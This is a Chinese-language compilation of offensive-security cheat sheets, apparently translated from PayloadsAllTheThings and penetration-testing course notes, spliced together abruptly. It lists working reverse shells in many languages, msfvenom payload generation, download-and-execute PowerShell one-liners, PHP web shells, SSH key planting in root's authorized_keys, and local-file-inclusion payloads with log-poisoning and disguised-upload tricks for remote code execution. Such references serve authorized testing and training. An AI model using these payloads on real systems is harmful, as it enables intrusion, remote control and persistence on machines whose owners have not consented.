### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk)Awk

```powershell
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java)Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

#### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-1)Java Alternative 1（Java 替代方案 1）

```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-2)Java Alternative 2（Java 替代方案 2）

**NOTE**: 这个更隐蔽

```java
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#telnet)Telnet

```shell
在攻击者机器上启动两个监听器：
nc -lvp 8080
nc -lvp 8081

在受害者机器上运行以下命令：
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#war)War

```java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # 用于获取文件名
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#lua)Lua

仅限 Linux

```powershell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

Windows 和 Linux

```powershell
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)NodeJS

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // 防止 Node.js 应用程序崩溃
})();


或

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

或

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

或

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy)Groovy

作者 [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注意：Java 反向 shell 也适用于 Groovy

```java
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy-alternative-1)Groovy 替代方案 1

**注意**：这种方式更隐蔽

```java
Thread.start {
    // 在此处放置反向 shell
}
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c)C

使用 `gcc /tmp/shell.c --output csh && csh` 编译

```cs
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#dart)Dart

```java
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.0.0.1", 4242).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#meterpreter-shell)Meterpreter Shell

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-staged-reverse-tcp)Windows 分阶段反向 TCP

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-stageless-reverse-tcp)Windows 无阶段反向 TCP

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#linux-staged-reverse-tcp)Linux 分阶段反向 TCP

```powershell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#linux-stageless-reverse-tcp)Linux 无阶段反向 TCP

```powershell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#other-platforms)其他平台

```powershell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)生成 TTY Shell

为了捕获 shell，你需要监听所需的端口。`rlwrap` 将增强 shell 功能，允许你使用 `[CTRL] + [L]` 清屏。

```powershell
rlwrap nc 10.0.0.1 4242

rlwrap -r -f . nc 10.0.0.1 4242
-f . 将使 rlwrap 使用当前历史文件作为补全词列表。
-r 将所有输入和输出中看到的词添加到补全列表中。
```

有时，你想在部分 tty shell 中访问快捷键、su、nano 和自动补全。

⚠️ OhMyZSH 可能会破坏这个技巧，建议使用简单的 `sh`

> 这里的主要问题是 zsh 处理 stty 命令的方式与 bash 或 sh 不同。[...] stty raw -echo; fg[...] 如果你尝试将其作为两个单独的命令执行，当提示符出现让你执行 fg 命令时，你的 -echo 命令已经失效了

```powershell
ctrl+z
echo $TERM && tput lines && tput cols

# 对于 bash
stty raw -echo
fg

# 对于 zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

或使用 `socat` 二进制文件获取完整的 tty 反向 shell

```shell
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

另外，`rustcat` 二进制文件可以自动注入 TTY shell 命令。

shell 将自动升级，并提供 TTY 大小以供手动调整。不仅如此，退出 shell 时，终端将被重置，因此可以继续使用。

```shell
stty raw -echo; stty size && rcat l -ie "/usr/bin/script -qc /bin/bash /dev/null" 6969 && reset
```

从解释器生成 TTY shell

```powershell
/bin/sh -i
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`
- mysql: `! bash`

替代 TTY 方法

```
www-data@debian:/dev/shm$ su - user
su: must be run from a terminal

www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
www-data@debian:/dev/shm$ su - user
Password: P4ssW0rD

user@debian:~$
```

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#fully-interactive-reverse-shell-on-windows)Windows 上的完全交互式反向 Shell

Windows 中伪控制台（ConPty）的引入大大改善了 Windows 处理终端的方式。

**ConPtyShell 使用 [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole) 函数。此函数自 Windows 10 / Windows Server 2019 版本 1809（构建版本 10.0.17763）起可用。**

服务器端：

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

客户端：

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

ps1 的离线版本可在此处获取 --> [https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#references)参考资料

- [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
- [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Spawning a TTY Shell](http://netsec.ws/?p=337)
- [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)## 基础工具

| **命令**   | **描述**   |
| --------------|-------------------|
| **通用** |
| `sudo openvpn user.ovpn` | 连接到 VPN |
| `ifconfig`/`ip a` | 显示我们的 IP 地址 |
| `netstat -rn` | 显示通过 VPN 可访问的网络 |
| `ssh user@10.10.10.10` | SSH 连接到远程服务器 |
| `ftp 10.129.42.253` | FTP 连接到远程服务器 |
| **tmux** |
| `tmux` | 启动 tmux |
| `ctrl+b` | tmux：默认前缀键 |
| `prefix c` | tmux：新建窗口 |
| `prefix 1` | tmux：切换到窗口（`1`） |
| `prefix shift+%` | tmux：垂直分割窗格 |
| `prefix shift+"` | tmux：水平分割窗格 |
| `prefix ->` | tmux：切换到右侧窗格 |
| **Vim** |
| `vim file` | vim：用 vim 打开 `file` |
| `esc+i` | vim：进入`插入`模式 |
| `esc` | vim：返回`普通`模式 |
| `x` | vim：剪切字符 |
| `dw` | vim：剪切单词 |
| `dd` | vim：剪切整行 |
| `yw` | vim：复制单词 |
| `yy` | vim：复制整行 |
| `p` | vim：粘贴 |
| `:1` | vim：跳转到第 1 行 |
| `:w` | vim：写入文件（即保存） |
| `:q` | vim：退出 |
| `:q!` | vim：不保存退出 |
| `:wq` | vim：写入并退出 |

## 渗透测试
| **命令**   | **描述**   |
| --------------|-------------------|
| **服务扫描** |
| `nmap 10.129.42.253` | 对 IP 运行 nmap |
| `nmap -sV -sC -p- 10.129.42.253` | 对 IP 运行 nmap 脚本扫描 |
| `locate scripts/citrix` | 列出各种可用的 nmap 脚本 |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | 对 IP 运行 nmap 脚本 |
| `netcat 10.10.10.10 22` | 抓取开放端口的 banner（横幅信息） |
| `smbclient -N -L \\\\10.129.42.253` | 列出 SMB 共享 |
| `smbclient \\\\10.129.42.253\\users` | 连接到特定的 SMB 共享 |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | 对 IP 扫描 SNMP |
| `onesixtyone -c dict.txt 10.129.42.254` | 暴力破解 SNMP 社区字符串 |
| **Web 枚举** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | 对网站运行目录扫描 |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | 对网站运行子域名扫描 |
| `curl -IL https://www.inlanefreight.com` | 抓取网站 banner |
| `whatweb 10.10.10.121` | 列出 Web 服务器/证书的详细信息 |
| `curl 10.10.10.121/robots.txt` | 列出 `robots.txt` 中的潜在目录 |
| `ctrl+U` | 查看页面源代码（在 Firefox 中） |
| **公开漏洞利用** |
| `searchsploit openssh 7.2` | 搜索 Web 应用程序的公开漏洞利用 |
| `msfconsole` | MSF：启动 Metasploit Framework |
| `search exploit eternalblue` | MSF：在 MSF 中搜索公开漏洞利用 |
| `use exploit/windows/smb/ms17_010_psexec` | MSF：开始使用 MSF 模块 |
| `show options` | MSF：显示 MSF 模块所需的选项 |
| `set RHOSTS 10.10.10.40` | MSF：为 MSF 模块选项设置值 |
| `check` | MSF：测试目标服务器是否存在漏洞 |
| `exploit` | MSF：对存在漏洞的目标服务器运行漏洞利用 |
| **使用 Shell** |
| `nc -lvnp 1234` | 在本地端口启动 `nc` 监听器 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | 从远程服务器发送反向 shell |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | 从远程服务器发送反向 shell 的另一个命令 |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | 在远程服务器上启动绑定 shell |
| `nc 10.10.10.1 1234` | 连接到远程服务器上启动的绑定 shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | 升级 shell TTY（方法 1） |
| `ctrl+z` 然后 `stty raw -echo` 然后 `fg` 然后按两次 `enter` | 升级 shell TTY（方法 2） |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | 创建 webshell php 文件 |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | 在上传的 webshell 上执行命令 |
| **权限提升** |
| `./linpeas.sh` | 运行 `linpeas` 脚本枚举远程服务器 |
| `sudo -l` | 列出可用的 `sudo` 权限 |
| `sudo -u user /bin/echo Hello World!` | 使用 `sudo` 运行命令 |
| `sudo su -` | 切换到 root 用户（如果我们有权访问 `sudo su`） |
| `sudo su user -` | 切换到某个用户（如果我们有权访问 `sudo su`） |
| `ssh-keygen -f key` | 创建新的 SSH 密钥 |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | 将生成的公钥添加到用户 |
| `ssh root@10.10.10.10 -i key` | 使用生成的私钥 SSH 连接到服务器 |
| **文件传输** |
| `python3 -m http.server 8000` | 启动本地 Web 服务器 |
| `wget http://10.10.14.1:8000/linpeas.sh` | 从我们的本地机器下载文件到远程服务器 |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | 从我们的本地机器下载文件到远程服务器 |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | 使用 `scp` 将文件传输到远程服务器（需要 SSH 访问权限） |
| `base64 shell -w 0` | 将文件转换为 `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | 将文件从 `base64` 转换回原始格式 |
| `md5sum shell` | 检查文件的 `md5sum` 以确保正确转换 |

#hacking #shell #enumeration #scanning #cheatsheet
## 本地文件包含（Local File Inclusion）

| **命令** | **描述** |
| --------------|-------------------|
| **基础 LFI** |
| `/index.php?language=/etc/passwd` | 基础 LFI |
| `/index.php?language=../../../../etc/passwd` | 带路径遍历的 LFI |
| `/index.php?language=/../../../etc/passwd` | 带名称前缀的 LFI |
| `/index.php?language=./languages/../../../../etc/passwd` | 带已批准路径的 LFI |
| **LFI 绕过** |
| `/index.php?language=....//....//....//....//etc/passwd` | 绕过基础路径遍历过滤器 |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | 使用 URL 编码绕过过滤器 |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | 使用路径截断绕过追加的扩展名（已过时） |
| `/index.php?language=../../../../etc/passwd%00` | 使用空字节绕过追加的扩展名（已过时） |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | 使用 base64 过滤器读取 PHP 文件 |


## 远程代码执行（Remote Code Execution）

| **命令** | **描述** |
| --------------|-------------------|
| **PHP Wrappers（PHP 包装器）** |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | 使用 data 包装器实现 RCE |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | 使用 input 包装器实现 RCE |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | 使用 expect 包装器实现 RCE |
| **RFI（远程文件包含）** |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | 托管 web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | 包含远程 PHP web shell |
| **LFI + 上传** |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | 创建恶意图片 |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | 使用上传的恶意图片实现 RCE |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | 创建恶意 zip 压缩包（伪装为 jpg） |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | 使用上传的恶意 zip 实现 RCE |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | 创建恶意 phar（伪装为 jpg） |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | 使用上传的恶意 phar 实现 RCE |
| **日志投毒（Log Poisoning）** |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | 读取 PHP 会话参数 |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | 使用 web shell 投毒 PHP 会话 |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | 通过投毒的 PHP 会话实现 RCE |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | 投毒服务器日志 |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | 通过投毒的 PHP 会话实现 RCE |


## 杂项

| **命令** | **描述** |
| --------------|-------------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | 模糊测试页面参数 |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | 模糊测试 LFI 载荷 |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | 模糊测试 webroot 路径 |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | 模糊测试服务器配置 |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Linux Webroot 路径字典](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Windows Webroot 路径字典](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Linux 服务器配置字典](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Windows 服务器配置字典](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |


## 文件包含函数

| **函数** | **读取内容** | **执行** | **远程 URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |# 信息收集（Footprinting）
## 基于基础设施的枚举

|**命令**|**描述**|
|-|-|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | 证书透明度查询。 |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | 使用 Shodan 扫描列表中的每个 IP 地址。 |

----
## 基于主机的枚举


##### FTP
|**命令**|**描述**|
|-|-|
| `ftp <FQDN/IP>` | 与目标上的 FTP 服务交互。 |
| `nc -nv <FQDN/IP> 21` | 与目标上的 FTP 服务交互。 |
| `telnet <FQDN/IP> 21` | 与目标上的 FTP 服务交互。 |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | 使用加密连接与目标上的 FTP 服务交互。 |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | 下载目标 FTP 服务器上的所有可用文件。 |


##### SMB
|**命令**|**描述**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | SMB 空会话认证。 |
| `smbclient //<FQDN/IP>/<share>` | 连接到特定的 SMB 共享。 |
| `rpcclient -U "" <FQDN/IP>` | 使用 RPC 与目标交互。 |
| `samrdump.py <FQDN/IP>` | 使用 Impacket 脚本枚举用户名。 |
| `smbmap -H <FQDN/IP>` | 枚举 SMB 共享。 |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | 使用空会话认证枚举 SMB 共享。 |
| `enum4linux-ng.py <FQDN/IP> -A` | 使用 enum4linux 进行 SMB 枚举。 |


##### NFS
|**命令**|**描述**|
|-|-|
| `showmount -e <FQDN/IP>` | 显示可用的 NFS 共享。 |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | 挂载指定的 NFS 共享。umount ./target-NFS |
| `umount ./target-NFS` | 卸载指定的 NFS 共享。 |


##### DNS
|**命令**|**描述**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | 向指定名称服务器发送 NS 请求。 |
| `dig any <domain.tld> @<nameserver>` | 向指定名称服务器发送 ANY 请求。 |
| `dig axfr <domain.tld> @<nameserver>` | 向指定名称服务器发送 AXFR（区域传输）请求。 |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | 子域名暴力破解。 |



##### SMTP
|**命令**|**描述**|
|-|-|
| `telnet <FQDN/IP> 25` |  |


##### IMAP/POP3
|**命令**|**描述**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | 使用 cURL 登录 IMAPS 服务。 |
| `openssl s_client -connect <FQDN/IP>:imaps` | 连接到 IMAPS 服务。 |
| `openssl s_client -connect <FQDN/IP>:pop3s` | 连接到 POP3s 服务。 |


##### SNMP
|**命令**|**描述**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | 使用 snmpwalk 查询 OID。 |
| `onesixtyone -c community-strings.list <FQDN/IP>` | 暴力破解 SNMP 服务的 community string（社区字符串）。 |
| `braa <community string>@<FQDN/IP>:.1.*` | 暴力破解 SNMP 服务 OID。 |


##### MySQL
|**命令**|**描述**|
|-|-|
| `mysql -u <user> -p<password> -h <FQDN/IP>` | 登录到 MySQL 服务器。 |


##### MSSQL
|**命令**|**描述**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | 使用 Windows 身份验证登录到 MSSQL 服务器。 |


##### IPMI
|**命令**|**描述**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI 版本检测。 |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | 导出 IPMI 哈希值。 |


##### Linux 远程管理
|**命令**|**描述**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | 对目标 SSH 服务进行远程安全审计。 |
| `ssh <user>@<FQDN/IP>` | 使用 SSH 客户端登录到 SSH 服务器。 |
| `ssh -i private.key <user>@<FQDN/IP>` | 使用私钥登录到 SSH 服务器。 |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | 强制使用密码认证。 |


##### Windows 远程管理
|**命令**|**描述**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | 检查 RDP 服务的安全设置。 |
